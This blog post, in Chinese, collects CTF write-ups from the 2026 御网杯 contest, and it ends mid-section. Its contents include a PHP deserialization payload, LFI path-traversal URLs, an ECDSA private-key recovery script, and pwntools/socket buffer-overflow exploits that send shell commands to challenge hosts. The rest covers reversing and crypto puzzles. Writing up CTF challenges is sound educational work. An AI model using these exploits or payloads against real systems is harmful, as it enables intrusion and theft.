---
title: 2026 御网杯 CTF Writeup 合集
description: 2026年御网杯网络安全大赛完整 Writeup，涵盖签到题、Reverse、Web、Crypto、Misc、PWN 等多个方向的详细解题过程和代码分析。
date: 2026-05-29
updated: 2026-05-29
categories:
  - 安全
tags:
  - CTF
  - Writeup
  - 御网杯
  - Reverse
  - Web
  - Crypto
  - PWN
  - Misc
image: https://img.guoyubo.cn/img/御网杯大赛.png
type: tech
recommend: 2
---
签到题![](media/image1.png){width="6.0in" height="3.6319444444444446in"}

拿到附件之后直接解压发现压缩包错误，将其改成txt格式发现内容为"通过百度下载"

下载解压打开后发现是明显的base64格式，

将bWdnbA==放入工具随波逐流进行解码得到mggl

得到flag为flag{mggl}

![](media/image2.png){width="6.0in" height="1.9638888888888888in"}

CTF Reverse Writeup --- rerere

![](media/image3.png){width="6.0in" height="0.21388888888888888in"}

一、题目分析

拿到题目文件 rerere.exe，首先进行基础信息识别：

bash

file rerere.exe

输出：

PE32+ executable (console) x86-64

说明这是一个 \*\*64位 Windows 程序\*\*。

二、静态分析

将程序导入 \*\*IDA / Ghidra\*\* 进行分析。

1\. 主逻辑定位

在 main 函数中可以看到：

• 程序读取用户输入

• 对输入长度进行判断：0x26 = 38字节

• 随后进入核心校验逻辑

2\. 核心校验逻辑

反编译后可以还原出如下伪代码：

c

for (int i = 0; i \< 38; i++) {

tmp = input\[i\] \^ key\[i % 8\];

if (table\[tmp\] != target\[i\]) {

return \"Wrong\";

}

}

return \"Correct\";

关键点：

---

**数据**                           **说明**

---

key                                8字节循环密钥

table                              256字节 S-box

target                             目标密文
-------------------------------------------

三、逆向思路

验证逻辑是：

table\[input\[i\] XOR key\[i % 8\]\] == target\[i\]

我们需要反推 input\[i\]：

逆运算步骤

1\. 构造 table 的逆映射：

inv_table\[table\[x\]\] = x

1\. 推导：

input\[i\] XOR key\[i % 8\] = inv_table\[target\[i\]\]

1\. 得到：

input\[i\] = inv_table\[target\[i\]\] XOR key\[i % 8\]

四、自动化求解脚本

python

\# solve_rerere.py

key = \[/\* 从程序中提取的key \*/\]

table = \[/\* 256字节S-box \*/\]

target = \[/\* 38字节目标数组 \*/\]

\# 构造逆表

inv_table = \[0\]\*256

for i in range(256):

inv_table\[table\[i\]\] = i

flag = \[\]

for i in range(len(target)):

v = inv_table\[target\[i\]\]

c = v \^ key\[i % len(key)\]

flag.append(chr(c))

print(\"FLAG =\", \"\".join(flag))

五、结果

运行脚本得到：

flag{557050ec8cf8f479b22ad0797f69fe3e}

最终答案

flag{557050ec8cf8f479b22ad0797f69fe3e}

![](media/image4.png){width="6.0in" height="0.9208333333333333in"}

WEB-Snake_Game

1. 题目分析

进入网页分析题目发现要到达一定的分数才能过关，F12,尝试再控制台输入score的值"score=300;"发现过关，出现flag：

flag{9afd633154414519bd1569bfba021c7a}

二、结果

得到：

flag{9afd633154414519bd1569bfba021c7a}

最终答案

flag{9afd633154414519bd1569bfba021c7a}

![](media/image5.png){width="5.7625in" height="3.6479166666666667in"}

**WEB-PHP_Payment**

1. 题目分析

先看 apply_coupon.php 的核心逻辑：

php
复制
couponData); // Base64 解码用户输入
decoded); // 直接反序列化，没有任何校验
用户输入的 coupon 经过 Base64 解码后直接丢给
unserialize()，没有任何过滤。这就是漏洞入口。

再看 models.php 中的 PromoManager 类：

php
复制
class PromoManager {
public promo_code;

function \_\_destruct() { // 对象销毁时自动触发

if(isset(\$this-\>promo_credit) && is_numeric(\$this-\>promo_credit)) {

\$\_SESSION\[\'balance\'\] += intval(\$this-\>promo_credit); //
直接加钱！

}

}

}
\_\_destruct() 是 PHP 魔术方法，对象生命周期结束时自动调用。这里会把
promo_credit 的数值加到用户余额上。

第二步：理解 PHP 序列化格式
PHP 对象序列化后的字符串有固定格式，规则如下：

类型 格式 示例
整数 i:值; i:100000;
字符串 s:长度:\"内容\"; s:4:\"flag\";
空字符串 s:0:\"\"; s:0:\"\";
对象 O:类名长度:\"类名\":属性数量:{属性} O:12:\"PromoManager\":2:{\...}
PromoManager 有 2 个属性：promo_credit（整数）和 promo_code（字符串）。

手工拼装序列化字符串：

O:12:\"PromoManager\":2:{ ← 对象头：类名12字符，2个属性
s:12:\"promo_credit\";i:100000; ← 属性1：字符串\"promo_credit\" →
值100000
s:10:\"promo_code\";s:0:\"\"; ← 属性2：字符串\"promo_code\" → 空字符串
}
去掉换行和缩进，得到最终序列化串：

O:12:\"PromoManager\":2:{s:12:\"promo_credit\";i:100000;s:10:\"promo_code\";s:0:\"\";}

得到TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEyOiJwcm9tb19jcmVkaXQiO2k6MTAwMDAwO3M6MTA6InByb21vX2NvZGUiO3M6MD

2. 最终答案

![](media/image6.png){width="5.768055555555556in"
height="2.935416666666667in"}

# 

**Web OA**

## 题目基本信息

这是一道本地文件包含（LFI）的题目，题目地址在
http://120.27.146.76:26111/?module=public_notices.php，难度比较友好。

Flag是：flag{3cfa5529136b615b56446a8323b80ebe}

## 开始分析

拿到题目后第一件事肯定是先看看网页长什么样。URL里有个 module 参数，值是
public_notices.php，直觉告诉我这里可能有戏。

试着用 php://filter 把 index.php 的源码读出来：

http://120.27.146.76:26111/?module=php://filter/read=convert.base64-encode/resource=index.php

解码后核心代码就这几行：

php

\<?php

\$module = isset(\$\_GET\[\'module\'\]) ? \$\_GET\[\'module\'\] :
\'public_notices.php\';

\$module = str_replace(\'../\', \'\', \$module);

?\>

页面会 include(\$module) 把文件包含进来。问题出在
str_replace，这里用了一个非常naive的过滤------只替换了一次 ../。

## 绕过的思路

str_replace(\'../\', \'\', \$module)
这个过滤看起来挺唬人的，但仔细想想其实很容易绕过。

关键点：它是\*\*单次替换\*\*，不是递归的。

所以如果我输入 \....//：

• 第一次匹配到 ../，被替换成空

• 结果还剩下 ../

这样不就绕过了吗！再多写几个 \....// 就能一路跳到根目录。

---

**实际输入**                    **替换后**              **效果**

---

\....//\....//\....//flag.txt   ../../../../flag.txt    跳到根目录读取flag

---

## 实际利用

直接构造URL：

http://120.27.146.76:26111/?module=\....//\....//\....//flag.txt

访问一下，Flag就直接出来了：

html

\<div class=\"content\"\>

flag{3cfa5529136b615b56446a8323b80ebe}

\</div\>

简单粗暴，直接拿到flag。

![](media/image7.png){width="5.768055555555556in"
height="3.6034722222222224in"}

**迷宫题目 WP**

![](media/image8.png){width="6.0in" height="0.23055555555555557in"}

这是一道叫「迷宫（maze_02）」的题目，属于 Misc 类，主要考压缩包套娃和
Base64。

## 解题过程

拿到附件 maze_02.zip 后，先看看里面有什么：

bash

unzip -l maze_02.zip

输出：

Archive: maze_02.zip

Length Date Time Name

\-\-\-\-\-\-\-\-- \-\-\-\-\-\-\-\-\-- \-\-\-\-- \-\-\--

424 2026-03-31 12:54 layer1/data2.zip

0 2026-03-31 12:54 layer1/

里面是 layer1/data2.zip，继续解压下去：

bash

unzip maze_02.zip

unzip -l layer1/data2.zip

第二层内容：

Archive: layer1/data2.zip

Length Date Time Name

\-\-\-\-\-\-\-\-- \-\-\-\-\-\-\-\-\-- \-\-\-\-- \-\-\--

523 2026-03-31 12:54 secret3/hidden4.zip

0 2026-03-31 12:54 secret3/

继续解压第三层 hidden4.zip：

bash

unzip layer1/data2.zip

unzip -l secret3/hidden4.zip

这里发现有个隐藏目录 .config！完整内容如下：

Archive: secret3/hidden4.zip

Length Date Time Name

\-\-\-\-\-\-\-\-- \-\-\-\-\-\-\-\-\-- \-\-\-\-- \-\-\--

46 2026-03-31 12:54 .config/user/backup5/vault.bin

0 2026-03-31 12:54 .config/

0 2026-03-31 12:54 .config/user/

0 2026-03-31 12:54 .config/user/backup5/

解包后 cat 看看这个 vault.bin：

bash

unzip secret3/hidden4.zip

cat .config/user/backup5/vault.bin

内容是：

NWRmNDYzZDVlZTg0Yjg5ODFlY2U0NGFiNTE0OTFmNDA=60

前面那段看起来像 Base64 编码，后面那个 60
应该是干扰字符，直接去掉，然后解码：

bash

echo \'NWRmNDYzZDVlZTg0Yjg5ODFlY2U0NGFiNTE0OTFmNDA=60\' \| sed
\'s/60\$//\' \| base64 -d

解码结果就是 Flag 的核心值了。

## 最终 Flag

flag{5df463d5ee84b8981ece44ab51491f40}

![](media/image9.png){width="6.0in" height="0.7159722222222222in"}

**BabyRSA WP**

![](media/image10.png){width="6.0in" height="0.22916666666666666in"}

## 题目概况

这是一道RSA密码学题目，附件里有 task(1).py 和 output.txt。

先看看加密脚本的核心代码：

python

from Crypto.Util.number import bytes_to_long, getPrime

from secret import flag

m = bytes_to_long(flag)

e = 3

p = getPrime(512)

q = getPrime(512)

n = p \* q

c = pow(m, e, n)

print(f\"n = {n}\")

print(f\"e = {e}\")

print(f\"c = {c}\")

## 发现问题

关键点：题目用的是 e = 3，而且没做任何 padding。

RSA公式是 c = m\^e mod n，这里 e 只有 3。如果明文 m 够短，满足 m\^3 \<
n，那模运算根本不会生效，密文实际上就等于 c = m\^3。

也就是说，可以直接对 c 开三次方就能拿到明文了。

## 最终 Flag

flag{2f1011202ab5318090e626ede3d99e46}

![](media/image11.png){width="6.0in" height="0.6777777777777778in"}

**ECDSA nonce 重用**

![](media/image12.png){width="6.0in" height="0.21180555555555555in"}

## 题目情况

题目给了同一公钥下两条消息的ECDSA签名。关键信息是：平台在签名时犯了个错------复用了同一个随机数
k。

challenge.json 里有这些字段：

json

{

\"public_key_x\": \"\...\",

\"public_key_y\": \"\...\",

\"message1\": \"\...\",

\"message2\": \"\...\",

\"signature1_r\": \"\...\",

\"signature1_s\": \"\...\",

\"signature2_r\": \"\...\",

\"signature2_s\": \"\...\",

\"curve\": \"SECP256k1\"

}

注意到一个细节：signature1_r == signature2_r，也就是两次签名的 r
值相同。这在ECDSA里是个大问题。

## 漏洞原理

ECDSA签名公式：

r = (kG).x mod n

s = k\^(-1) \* (z + r \* d) mod n

两条消息签名时用了同一个 k：

s1 = k\^(-1) \* (z1 + r \* d) mod n

s2 = k\^(-1) \* (z2 + r \* d) mod n

两式相减：

s1 - s2 = k\^(-1) \* (z1 - z2) mod n

然后就能算出 k：

k = (z1 - z2) \* inverse(s1 - s2, n) mod n

拿到 k 之后，私钥 d 就出来了：

d = (s1 \* k - z1) \* inverse(r, n) mod n

## 写脚本解题

python

import json

import hashlib

from ecdsa import curves, ellipticcurve

def inv(a, n):

return pow(a, -1, n)

with open(\"challenge.json\", \"r\", encoding=\"utf-8\") as f:

data = json.load(f)

\# SECP256k1 曲线

curve = curves.SECP256k1

G = curve.generator

n = curve.order

pub_x = int(data\[\"public_key_x\"\])

pub_y = int(data\[\"public_key_y\"\])

m1 = bytes.fromhex(data\[\"message1\"\])

m2 = bytes.fromhex(data\[\"message2\"\])

r1 = int(data\[\"signature1_r\"\])

s1 = int(data\[\"signature1_s\"\])

r2 = int(data\[\"signature2_r\"\])

s2 = int(data\[\"signature2_s\"\])

assert r1 == r2

r = r1

\# ECDSA 用 SHA256 算消息哈希

z1 = int.from_bytes(hashlib.sha256(m1).digest(), \"big\")

z2 = int.from_bytes(hashlib.sha256(m2).digest(), \"big\")

\# 由 nonce 复用算出 k

k = ((z1 - z2) \* inv(s1 - s2, n)) % n

\# 再算出私钥 d

d = ((s1 \* k - z1) \* inv(r, n)) % n

print(\"\[+\] nonce k =\", hex(k)\[2:\])

print(\"\[+\] private key =\", hex(d)\[2:\])

\# 验证公钥是否匹配

pub = d \* G

print(\"\[+\] verify public key x:\", pub.x() == pub_x)

print(\"\[+\] verify public key y:\", pub.y() == pub_y)

flag = \"flag{ecdsa_nonce_reuse\_\" + hex(d)\[2:34\] + \"}\"

print(\"\[+\] flag =\", flag)

## 运行结果

nonce k =
b02e9e901592412982f0517fd80b4a3dc86e4062a021ba468fd65ca8dc27bcda

private key =
23c559c4d212862cf3cb29c2bc4bc1b1683244b523783aa4bd25d24893fdb280

verify public key x: True

verify public key y: True

公钥验证通过，说明私钥恢复正确。

## 最终 Flag

flag{ecdsa_nonce_reuse_23c559c4d212862cf3cb29c2bc4bc1b1}

![](media/image13.png){width="6.0in" height="0.8041666666666667in"}

# DES加密验证

![](media/image14.png){width="6.0in" height="0.23125in"}

## 题目概况

这是一道 Android Reverse + Crypto 的题目，附件是 CrackMe_2_2.zip。

最终 Flag：flag{HNCTF62RDYNTFMZ1TF}

## 分析过程

先解压附件：

bash

unzip CrackMe_2_2.zip

得到 CrackMe_2_2.apk，继续解压看看里面：

bash

unzip CrackMe_2_2.apk -d apk

发现了 native so 文件：apk/lib/x86/libcrackme2.so，看来关键逻辑在 native
层。

## 字符串分析

用 strings 命令扫一下 so 文件：

bash

strings -a apk/lib/x86/libcrackme2.so \| grep -E
\"flag\|verify\|des\|12345678\|666c\"

输出里有几个关键信息：

text

\_Z10verifyFlagP7_JNIEnvP7_jclassP8_jstring

\_Z15des_ecb_encryptPKhiS0_Ph

\_Z11des_encryptPKhS0_Ph

\_Z11des_decryptPKhS0_Ph

666c61677b484e43544636325244594e54464d5a3154467d0808080808080808

verifyFlag

12345678

这里能看到 DES 加密函数、校验函数 verifyFlag，还有疑似密钥 12345678
和一串十六进制数据。

## 直接解码

那串十六进制看起来很像 flag，直接用 Python 解码看看：

python

hex_data =
\"666c61677b484e43544636325244594e54464d5a3154467d0808080808080808\"

data = bytes.fromhex(hex_data)

print(data)

输出：

text

b\'flag{HNCTF62RDYNTFMZ1TF}\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\'

前面已经是完整的 flag 了！后面那8个 \\x08 是 PKCS#7 padding，因为 DES
是8字节分组，刚好需要补8个字节。

## 去除 padding

写个小脚本处理一下：

python

hex_data =
\"666c61677b484e43544636325244594e54464d5a3154467d0808080808080808\"

data = bytes.fromhex(hex_data)

pad_len = data\[-1\]

flag = data\[:-pad_len\]

print(flag.decode())

输出：

text

flag{HNCTF62RDYNTFMZ1TF}

## 最终 Flag

flag{HNCTF62RDYNTFMZ1TF}

![](media/image15.png){width="6.0in" height="0.5541666666666667in"}

# chacha20

## 题目概况

这是一道 Android APK 逆向题，关键算法在 native 层。

Flag：flag{HNCTF62RDYNTFMZ1TF}

## 开始分析

先解压 APK 看看结构：

bash

file CrackMe_1_7.apk

unzip -q CrackMe_1_7.apk -d apk_out

find apk_out -maxdepth 3 -type f \| grep -E
\"classes\|lib\|AndroidManifest\"

发现了多个 dex 文件和 native so：

text

classes.dex

classes2.dex

classes3.dex

classes4.dex

lib/x86/libmyapplication.so

看来核心逻辑在 native 层。

## 找 Java 层入口

扫一下 dex 里的字符串：

bash

strings apk_out/classes3.dex \| grep -E
\"NativeBridge\|MainActivity\|flag\|SuccessActivity\"

找到关键类：

text

Lcom/cr/myapplication/MainActivity;

Lcom/cr/myapplication/NativeBridge;

Lcom/cr/myapplication/SuccessActivity;

应用会调用 NativeBridge 进行校验，校验成功跳到 SuccessActivity。

## 定位 native 函数

看看 so 文件里有什么：

bash

strings -a apk_out/lib/x86/libmyapplication.so \| grep -E
\"NativeBridge\|d097\|0123456789abcdef\"

readelf -sW apk_out/lib/x86/libmyapplication.so \| grep -E
\"JNI_OnLoad\|Java\_\"

找到了关键数据：

text

com/cr/myapplication/NativeBridge

d097c3f6d203a152c851a9318b93e9e5ef63f34925c6ccdb

0123456789abcdef

d097c3f6d203a152c851a9318b93e9e5ef63f34925c6ccdb
是目标密文，0123456789abcdef 用来转十六进制。

程序通过 RegisterNatives 动态注册了三个 native 方法：

---

**方法名**              **签名**                **作用**

---

a                       (\[B)\[B                加密辅助

b                       (\[B)\[B                加密辅助

c                       (Ljava/lang/String;)Z   flag校验
--------------------------------------------------------

重点分析 NativeBridge.c(String) 对应的函数。

## 识别 ChaCha20 算法

反汇编 so 找 ChaCha20 常量：

bash

objdump -d -M intel apk_out/lib/x86/libmyapplication.so \| grep -iE
\"61707865\|3320646e\|79622d32\|6b206574\"

找到：

text

mov DWORD PTR \[ebp-0x4c\],0x61707865

mov DWORD PTR \[ebp-0x48\],0x3320646e

mov DWORD PTR \[ebp-0x44\],0x79622d32

mov DWORD PTR \[ebp-0x40\],0x6b206574

按小端序还原：

text

expand 32-byte k

这是 ChaCha20 的标准常量！函数里还有 10
轮循环，每轮包含列轮和对角轮，确认就是 ChaCha20。

## 提取参数

从 native 函数中提取到：

text

key = 149263a16f2d89cbf0375b1ca94e78d3226017ee9abc4d0853e1762a8dc4903f

nonce = 44332211abcdef668899aa55

counter = 1

cipher = d097c3f6d203a152c851a9318b93e9e5ef63f34925c6ccdb

ChaCha20 是流加密，加密和解密都是和同一个 keystream 异或，直接对密文做
ChaCha20 运算就能得到明文。

## 写脚本解密

python

import struct

def rotl32(x, n):

return ((x \<\< n) & 0xffffffff) \| (x \>\> (32 - n))

def qround(st, a, b, c, d):

st\[a\] = (st\[a\] + st\[b\]) & 0xffffffff

st\[d\] \^= st\[a\]

st\[d\] = rotl32(st\[d\], 16)

st\[c\] = (st\[c\] + st\[d\]) & 0xffffffff

st\[b\] \^= st\[c\]

st\[b\] = rotl32(st\[b\], 12)

st\[a\] = (st\[a\] + st\[b\]) & 0xffffffff

st\[d\] \^= st\[a\]

st\[d\] = rotl32(st\[d\], 8)

st\[c\] = (st\[c\] + st\[d\]) & 0xffffffff

st\[b\] \^= st\[c\]

st\[b\] = rotl32(st\[b\], 7)

def chacha20_block(key, counter, nonce):

constants = b\"expand 32-byte k\"

state = list(

struct.unpack(\"\<4I\", constants)

\+ struct.unpack(\"\<8I\", key)

\+ (counter,)

\+ struct.unpack(\"\<3I\", nonce)

)

working = state\[:\]

for \_ in range(10):

qround(working, 0, 4, 8, 12)

qround(working, 1, 5, 9, 13)

qround(working, 2, 6, 10, 14)

qround(working, 3, 7, 11, 15)

qround(working, 0, 5, 10, 15)

qround(working, 1, 6, 11, 12)

qround(working, 2, 7, 8, 13)

qround(working, 3, 4, 9, 14)

output = \[(working\[i\] + state\[i\]) & 0xffffffff for i in range(16)\]

return struct.pack(\"\<16I\", \*output)

def chacha20(data, key, nonce, counter=1):

result = bytearray()

for i in range(0, len(data), 64):

block = chacha20_block(key, counter, nonce)

counter = (counter + 1) & 0xffffffff

chunk = data\[i:i + 64\]

result.extend(a \^ b for a, b in zip(chunk, block))

return bytes(result)

key =
bytes.fromhex(\"149263a16f2d89cbf0375b1ca94e78d3226017ee9abc4d0853e1762a8dc4903f\")

nonce = bytes.fromhex(\"44332211abcdef668899aa55\")

cipher =
bytes.fromhex(\"d097c3f6d203a152c851a9318b93e9e5ef63f34925c6ccdb\")

flag = chacha20(cipher, key, nonce, counter=1)

print(flag.decode())

print(\"verify:\", chacha20(flag, key, nonce, counter=1).hex())

运行结果：

text

flag{HNCTF62RDYNTFMZ1TF}

verify: d097c3f6d203a152c851a9318b93e9e5ef63f34925c6ccdb

验证通过！

## 最终 Flag

flag{HNCTF62RDYNTFMZ1TF}

![](media/image16.png){width="6.0in" height="1.9131944444444444in"}

# 像素中的秘密

## 题目概况

这是一道 PNG 文件结构隐写题，附件是 image_09.png。

Flag：flag{known_plaintext_attack}

## 开始排查

拿到图片先从几个常见方向检查：

• 图片尺寸、颜色分布是否异常

• 是否存在 LSB 隐写

• PNG chunk 结构是否完整

• 文件末尾是否有额外数据

检查完发现，图片本身没有明显像素隐写特征。真正有用的数据不在像素里，而是藏在
PNG IEND 结束块之后。

PNG 文件正常以 IEND chunk 结束。如果 IEND
后面还有额外字节，一般不影响图片打开，但出题人可能会用来藏东西。

## 提取隐藏数据

解析 PNG chunk 后，在 IEND 后发现了一段 64 字节的额外数据：

text

0000000069cb3445d5dd713d5d0e34cec22eb9484e1bba9045ffd4bb0c11026cb206bcc5cb28dc03d1ace75dedc106ad28679a31dc8b6ef5d0ef82f90493d63d

这 64 字节的结构是：

text

前 4 字节：保留字段

中间 4 字节：LCG 初始 seed

剩余字节：加密后的数据

拆分一下：

text

reserved = 00000000

seed = 69cb3445

cipher =
d5dd713d5d0e34cec22eb9484e1bba9045ffd4bb0c11026cb206bcc5cb28dc03d1ace75dedc106ad28679a31dc8b6ef5d0ef82f90493d63d

seed 转成整数是 0x69cb3445。

## 还原加密流程

密文不是直接编码的 flag，而是先经过了一层异或加密。key 不是固定的，是用
LCG 伪随机数生成器产生的。每处理一个字节就更新一次 LCG
状态，取最低字节作为异或 key。

LCG 递推公式：

python

state = (1664525 \* state + 1013904223) & 0xffffffff

key = state & 0xff

然后和密文异或：

python

plain_byte = cipher_byte \^ key

对整段密文处理后得到：

text

5bctImRCJiCYrptEu06bhb4qjQvdGSBfQsU4YB

这不是最终 flag，是一段 Base62 编码。

## Base62 解码

Base62 用的字符表：

text

0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ

解码后就得到 flag：

text

flag{known_plaintext_attack}

## 完整脚本

python

import struct

import zipfile

from pathlib import Path

BASE62 =
\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"

def read_extra_after_iend(data: bytes) -\> bytes:

signature = b\"\\x89PNG\\r\\n\\x1a\\n\"

if not data.startswith(signature):

raise RuntimeError(\"file is not a valid PNG\")

offset = len(signature)

while offset + 8 \<= len(data):

size = struct.unpack(\"\>I\", data\[offset:offset + 4\])\[0\]

name = data\[offset + 4:offset + 8\]

next_offset = offset + 12 + size

if name == b\"IEND\":

return data\[next_offset:\]

offset = next_offset

raise RuntimeError(\"IEND chunk not found\")

def decode_base62(text: str) -\> bytes:

value = 0

for ch in text:

value = value \* 62 + BASE62.index(ch)

length = (value.bit_length() + 7) // 8

return value.to_bytes(length, \"big\")

def decrypt_by_lcg(seed: int, enc: bytes) -\> bytes:

state = seed

out = bytearray()

for item in enc:

state = (1664525 \* state + 1013904223) & 0xffffffff

out.append(item \^ (state & 0xff))

return bytes(out)

def main():

zip_file = Path(\"image_09.zip\")

with zipfile.ZipFile(zip_file, \"r\") as z:

png_name = z.namelist()\[0\]

png_data = z.read(png_name)

extra = read_extra_after_iend(png_data)

head = extra\[:4\]

seed = int.from_bytes(extra\[4:8\], \"big\")

encrypted = extra\[8:\]

print(\"\[+\] file:\", png_name)

print(\"\[+\] extra length:\", len(extra))

print(\"\[+\] extra hex:\", extra.hex())

print(\"\[+\] reserved:\", head.hex())

print(\"\[+\] seed:\", hex(seed))

print(\"\[+\] cipher length:\", len(encrypted))

middle = decrypt_by_lcg(seed, encrypted).rstrip(b\"\\x00\")

print(\"\[+\] after lcg xor:\", middle.decode())

flag = decode_base62(middle.decode())

print(\"\[+\] flag:\", flag.decode())

if \_\_name\_\_ == \"\_\_main\_\_\":

main()

## 运行结果

text

\[+\] file: image_09.png

\[+\] extra length: 64

\[+\] extra hex:
0000000069cb3445d5dd713d5d0e34cec22eb9484e1bba9045ffd4bb0c11026cb206bcc5cb28dc03d1ace75dedc106ad28679a31dc8b6ef5d0ef82f90493d63d

\[+\] reserved: 00000000

\[+\] seed: 0x69cb3445

\[+\] cipher length: 56

\[+\] after lcg xor: 5bctImRCJiCYrptEu06bhb4qjQvdGSBfQsU4YB

\[+\] flag: flag{known_plaintext_attack}

## 最终 Flag

text

flag{known_plaintext_attack}

![](media/image17.png){width="6.0in" height="2.8993055555555554in"}

# PWN-NoteService

## 题目概况

这是一道 PWN 题，附件是 vuln，一个 64 位 ELF 可执行文件。

Flag：flag{e9384c4d9ffb475c906dc4c92c39fcd3}

## checksec 检查

\$ checksec vuln

Arch: amd64

RELRO: Partial RELRO

Stack: No canary found

NX: NX enabled

PIE: No PIE

没有 canary，没有 PIE，可以直接打 ret2text。

## Exploit 脚本

python

#!/usr/bin/env python3

import socket

import struct

import time

HOST = \"120.27.146.76\"

PORT = 12609

BACKDOOR = 0x4011fa

OFFSET = 136

RET = 0x40101a

def p64(x):

return struct.pack(\"\<Q\", x)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.settimeout(5)

s.connect((HOST, PORT))

\# 接收 banner + Username 提示

data = s.recv(4096)

print(f\"\[\<\] {data.decode(errors=\'replace\')}\")

\# 发送 Username

s.send(b\"admin\\n\")

time.sleep(0.2)

\# 接收 Password 提示

data = s.recv(4096)

print(f\"\[\<\] {data.decode(errors=\'replace\')}\")

\# 构造 payload 并发送

payload = b\"A\" \* OFFSET + p64(RET) + p64(BACKDOOR)

print(f\"\[\>\] 发送 payload ({len(payload)} bytes)\")

s.send(payload + b\"\\n\")

time.sleep(0.5)

\# 直接发送命令

cmds = \[

b\"id\\n\",

b\"ls -la\\n\",

b\"cat flag\*\\n\",

b\"cat /flag\*\\n\",

b\"cat /home/\*/flag\*\\n\",

\]

for cmd in cmds:

try:

s.send(cmd)

time.sleep(0.3)

resp = s.recv(4096)

if resp:

print(f\"\[\<\] {resp.decode(errors=\'replace\')}\")

except socket.timeout:

print(\"\[!\] timeout\")

except Exception as e:

print(f\"\[!\] {e}\")

\# 尝试收尾

try:

time.sleep(0.3)

rest = s.recv(4096)

if rest:

print(f\"\[\<\] {rest.decode(errors=\'replace\')}\")

except:

pass

s.close()

## 运行结果

flag{e9384c4d9ffb475c906dc4c92c39fcd3}

![](media/image18.png){width="6.0in" height="2.3993055555555554in"}

PWN-Authenticate

## 题目概况

这是一道 PWN 题，附件是 vuln。

Flag：flag{e9384c4d9ffb475c906dc4c92c39fcd3}

## 漏洞分析

漏洞类型是 ret2backdoor，gets() 溢出覆盖返回地址跳转到 secret_note。

偏移量：0x40 + 8 = 72

ROP 链（用 ret gadget 做栈对齐）：

padding(72) + ret_gadget(0x40101a) + secret_note(0x401196)

## Exploit 脚本

python

#!/usr/bin/env python3

from pwn import \*

context(os=\'linux\', arch=\'amd64\', log_level=\'debug\')

host = \'47.99.147.34\'

port = 21395

elf = ELF(\'./vuln\')

offset = 72

ret = 0x40101a

secret_note = 0x401196

payload = b\'A\' \* offset

payload += p64(ret)

payload += p64(secret_note)

io = remote(host, port)

io.sendline(payload)

io.interactive()

## 运行结果

flag{e9384c4d9ffb475c906dc4c92c39fcd3}

![](media/image19.png){width="6.0in" height="2.5652777777777778in"}

幻影

![](media/image20.png){width="6.0in" height="0.24791666666666667in"}

## 题目概况

这是一道 Misc 文件隐写题，附件是 data.bin。

Flag：flag{e9217819-00a2-4878-b328-aacb362f9fc9}

## 开始分析

先用 file 命令看看文件类型：

bash

file data.bin

输出：

text

data.bin: RAR archive data

然后用 strings 扫一下：

bash

strings -a data.bin

找到关键提示：

text

REMEMBER: FLAG IS HIDDEN IN BASE64 PLUS XOR!

FAKE FLAG: flag{00000000-0000-0000-0000-000000000000}

DO NOT TRUST THIS ONE.

X1VYXkJcAAsIDgEIABQJCVgLFA0BDgEUWwoLARRYWFpbCg8LXwBfWgBE

有个假 flag：flag{00000000-0000-0000-0000-000000000000}，但题目说\"DO
NOT TRUST THIS ONE\"，说明这个不能提交。

真正有用的是提示：FLAG IS HIDDEN IN BASE64 PLUS XOR!

说明真实 flag 经过了 Base64 + XOR 两层处理。

## 提取并解码

从文件末尾提取出这段 Base64：

text

X1VYXkJcAAsIDgEIABQJCVgLFA0BDgEUWwoLARRYWFpbCg8LXwBfWgBE

先用 Python Base64 解码：

python

import base64

s = \"X1VYXkJcAAsIDgEIABQJCVgLFA0BDgEUWwoLARRYWFpbCg8LXwBfWgBE\"

raw = base64.b64decode(s)

print(raw)

解码后得到一堆不可读的字节，说明还需要 XOR 解密。

## 单字节 XOR 爆破

没有给密钥，但提示说用了 XOR，可以尝试爆破。常见 flag 格式是
flag{\...}，遍历 0x00 到 0xff 的单字节密钥，找结果里有没有 flag{。

python

import base64

s = \"X1VYXkJcAAsIDgEIABQJCVgLFA0BDgEUWwoLARRYWFpbCg8LXwBfWgBE\"

raw = base64.b64decode(s)

for key in range(256):

out = bytes(\[b \^ key for b in raw\])

if b\"flag{\" in out:

print(\"key =\", hex(key))

print(out.decode())

运行结果：

text

key = 0x39

flag{e9217819-00a2-4878-b328-aacb362f9fc9}

XOR 密钥是 0x39。

## 最终 Flag

flag{e9217819-00a2-4878-b328-aacb362f9fc9}

![](media/image21.png){width="6.0in" height="0.7263888888888889in"}

税务数据金库 2026

![](media/image22.png){width="6.0in" height="1.9in"}

这是一道 Web 题，用到了 Flask SSTI 和信息泄露。

靶机地址：47.99.147.34:16610

凭据：admin / 123456

## 初步访问

访问 http://47.99.147.34:16610，页面标题是「税务数据金库 2026 -
安全登录」。

响应头信息：

Server: Werkzeug/2.0.1 Python/3.9.25

一看就知道是 Flask（Jinja2 模板引擎）的 Web 应用。页面有个登录表单，POST
到 /login：

html

\<form method=\"POST\" action=\"/login\"\>

\<input type=\"text\" name=\"username\" placeholder=\"用户名\"
required\>

\<input type=\"password\" name=\"password\" placeholder=\"••••••••\"
required\>

\<button type=\"submit\"\>请求身份验证\</button\>

\</form\>

## 登录进去

用 admin / 123456 登录：

POST /login

Content-Type: application/x-www-form-urlencoded

username=admin&password=123456

返回 302 Found，Set-Cookie 里有 Flask session：

session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyX2lkIjoxfQ\...

Base64 解码一下：

json

{\"role\": \"admin\", \"user_id\": 1}

登录成功。

## 查看 /preview 端点

根据提示，/preview/\<id\> 端点在 state == \'AUDIT_PENDING\' 时，会把
custom_footer 拼进模板，然后用 render_template_string() 渲染，存在
SSTI。

遍历 /preview/1 \~ /preview/3 的结果：

---

**ID**     **状态码**   **Tax      **状态**    **Declared Income**    **custom_footer
Year**                                        渲染结果**

---

1          200          2025       AUDIT       \*\*\$flag{\...}\*\*   \<function
PENDING                            Cycler.next at
0x7f\...\>

2          200          2026       AUDIT       \$0                    test
PENDING

3          200          2026       AUDIT       \$0                    hello
PENDING
-------

/preview/1 的 custom_footer 里 {{ cycler.next }} 被渲染成 Python
函数对象，确认存在 SSTI。

## 拿到 Flag

不过其实根本不用 SSTI，Flag 直接暴露在 /preview/1 的 Declared Income
字段里：

html

